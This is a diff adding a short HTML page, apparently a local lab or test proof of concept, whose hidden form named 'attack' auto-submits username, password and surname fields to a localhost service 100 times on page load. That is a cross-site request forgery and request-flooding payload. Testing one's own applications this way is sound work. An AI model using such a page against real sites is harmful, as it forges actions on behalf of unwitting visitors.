@@ -1,0 +1,14 @@
+<html>
+    <body>
+        <form id="attack" action="http://localhost:8080/" method="POST">
+                <input type="hidden" name="username" value="X">
+                <input type="hidden" name="password" value="X">
+                <input type="hidden" name="surname" value="X">
+        </form>
+        <script>
+            for (let i = 0; i < 100; i++) {
+                document.forms[0].submit();
+            }
+        </script>
+    </body>
+</html>
